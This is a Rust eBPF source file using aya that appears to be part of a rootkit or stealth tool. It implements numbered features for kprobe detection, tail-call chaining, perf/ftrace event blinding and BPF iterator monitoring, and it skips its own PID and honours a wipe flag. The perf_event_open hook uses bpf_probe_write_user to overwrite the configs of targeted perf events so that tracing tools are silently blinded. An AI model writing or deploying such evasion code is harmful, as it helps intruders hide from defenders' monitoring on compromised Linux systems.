use aya_ebpf::{
    helpers::{bpf_get_current_pid_tgid, bpf_ktime_get_ns, bpf_probe_write_user, bpf_tail_call},
    macros::{kprobe, kretprobe},
    programs::{ProbeContext, RetProbeContext},
};
use common::{
    EventHeader, EVENT_BPF_ITER_ABUSED, EVENT_FTRACE_BLINDED, EVENT_KPROBE_DETECTED,
    EVENT_TAIL_CALL_CHAIN,
};

use crate::maps::*;

// ──────────────────────────────────────────────
// FEATURE 25: Kprobe Detection & Evasion
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_register_kprobe(ctx: ProbeContext) -> u32 {
    try_register_kprobe(&ctx).unwrap_or_default()
}

fn try_register_kprobe(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let kp_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let addr: u64 =
        unsafe { aya_ebpf::helpers::bpf_probe_read_kernel((kp_ptr + 8) as *const u64)? };

    if unsafe { KPROBE_DETECT_STATE.get(&addr) }.is_some() {
        let event = EventHeader {
            event_type: EVENT_KPROBE_DETECTED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: addr,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 26: eBPF Tail-Call Chains
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_tail_chain_entry(ctx: ProbeContext) -> u32 {
    try_tail_chain_entry(&ctx).unwrap_or_default()
}

fn try_tail_chain_entry(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let event = EventHeader {
        event_type: EVENT_TAIL_CALL_CHAIN,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: 0,
    };
    let _ = EVENTS.output(&event, 0);

    unsafe {
        bpf_tail_call(ctx.as_ptr(), &TAIL_CALL_PROGS as *const _ as *mut _, 0);
    }

    Ok(0)
}

#[kprobe]
pub fn shadow_tail_chain_stage1(ctx: ProbeContext) -> u32 {
    try_tail_chain_stage1(&ctx).unwrap_or_default()
}

fn try_tail_chain_stage1(ctx: &ProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();
    let _pid = (pid_tgid >> 32) as u32;

    unsafe {
        bpf_tail_call(ctx.as_ptr(), &TAIL_CALL_PROGS as *const _ as *mut _, 1);
    }

    Ok(0)
}

#[kprobe]
pub fn shadow_tail_chain_stage2(_ctx: ProbeContext) -> u32 {
    0
}

// ──────────────────────────────────────────────
// FEATURE 27: Ftrace/Perf Event Blinding
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_perf_event_open(ctx: ProbeContext) -> u32 {
    try_perf_event_open(&ctx).unwrap_or_default()
}

fn try_perf_event_open(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let attr_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    let config: u64 =
        unsafe { aya_ebpf::helpers::bpf_probe_read_kernel((attr_ptr + 8) as *const u64)? };

    if unsafe { FTRACE_BLIND_TARGETS.get(&config) }.is_some() {
        let fake_config: u64 = 0xFFFFFFFF;
        unsafe {
            let _ = bpf_probe_write_user(
                (attr_ptr + 8) as *mut u64,
                &fake_config as *const u64,
            );
        }

        let event = EventHeader {
            event_type: EVENT_FTRACE_BLINDED,
            pid,
            timestamp_ns: unsafe { bpf_ktime_get_ns() },
            context: config,
        };
        let _ = EVENTS.output(&event, 0);
    }

    Ok(0)
}

// ──────────────────────────────────────────────
// FEATURE 28: BPF Iterator Abuse
// ──────────────────────────────────────────────

#[kprobe]
pub fn shadow_bpf_iter_run_enter(ctx: ProbeContext) -> u32 {
    try_bpf_iter_run_enter(&ctx).unwrap_or_default()
}

fn try_bpf_iter_run_enter(ctx: &ProbeContext) -> Result<u32, i64> {
    if let Some(flag) = unsafe { WIPE_FLAG.get(0) } {
        if *flag != 0 {
            return Ok(0);
        }
    }

    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let key: u32 = 0;
    if let Some(cfg) = unsafe { CONFIG.get(&key) } {
        if cfg.self_pid == pid {
            return Ok(0);
        }
    }

    let prog_ptr: u64 = unsafe { ctx.arg(0).ok_or(1i64)? };
    unsafe { BPF_ITER_STATE.insert(&pid, &prog_ptr, 0)? };

    Ok(0)
}

#[kretprobe]
pub fn shadow_bpf_iter_run_exit(ctx: RetProbeContext) -> u32 {
    try_bpf_iter_run_exit(&ctx).unwrap_or_default()
}

fn try_bpf_iter_run_exit(ctx: &RetProbeContext) -> Result<u32, i64> {
    let pid_tgid = bpf_get_current_pid_tgid();
    let pid = (pid_tgid >> 32) as u32;

    let prog_ptr = match unsafe { BPF_ITER_STATE.get(&pid) } {
        Some(&v) => v,
        None => return Ok(0),
    };
    unsafe { BPF_ITER_STATE.remove(&pid)? };

    let ret: i64 = ctx.ret().ok_or(1i64)?;
    if ret < 0 {
        return Ok(0);
    }

    let event = EventHeader {
        event_type: EVENT_BPF_ITER_ABUSED,
        pid,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: prog_ptr,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(0)
}
